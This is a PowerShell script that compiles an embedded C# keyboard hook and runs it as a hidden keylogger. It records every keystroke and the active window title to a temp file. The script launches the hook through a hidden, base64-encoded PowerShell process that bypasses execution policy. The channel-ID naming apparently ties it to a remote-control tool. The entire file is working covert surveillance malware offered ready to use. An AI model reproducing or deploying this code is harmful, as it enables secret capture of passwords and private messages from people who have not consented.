param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$mutexName = "Global\Keylogger_$channelID"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"

# Kill any previous instance for this channel
if (Test-Path $pidFile) {
    $oldPid = Get-Content $pidFile
    Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
    Remove-Item $pidFile -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}

# Clean previous log file if exists
Remove-Item $logFile -Force -ErrorAction SilentlyContinue

# Simplified, proven C# keylogger (based on PowerSploit's Get-Keystrokes)
$cSharpCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class Keylogger
{
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logFile;
    private static StreamWriter _writer;
    private static string _mutexName;

    public static void Start(string logFile, string mutexName)
    {
        _logFile = logFile;
        _mutexName = mutexName;
        _writer = new StreamWriter(logFile, true) { AutoFlush = true };
        
        // Create mutex to signal readiness
        using (Mutex mutex = new Mutex(false, mutexName))
        {
            mutex.ReleaseMutex();
        }

        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
        System.Windows.Forms.Application.Run();
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            
            // Get foreground window title
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();
            string windowTitle = "";
            if (GetWindowText(handle, buff, nChars) > 0)
            {
                windowTitle = buff.ToString();
            }

            string keyName = ((Keys)vkCode).ToString();
            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}][{windowTitle}] {keyName}");
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@

# Launch hidden PowerShell process with the compiled code
$psScript = @"
Add-Type -TypeDefinition @'
$cSharpCode
'@ -ReferencedAssemblies "System.Windows.Forms"
[Keylogger]::Start("$logFile", "$mutexName")
"@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($psScript)
$encodedCommand = [Convert]::ToBase64String($bytes)

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
$p = [System.Diagnostics.Process]::Start($psi)

# Wait for mutex to confirm keylogger is running
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
$mutex.WaitOne(5000) | Out-Null
$mutex.Close()

$p.Id | Out-File -FilePath $pidFile -Force

Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"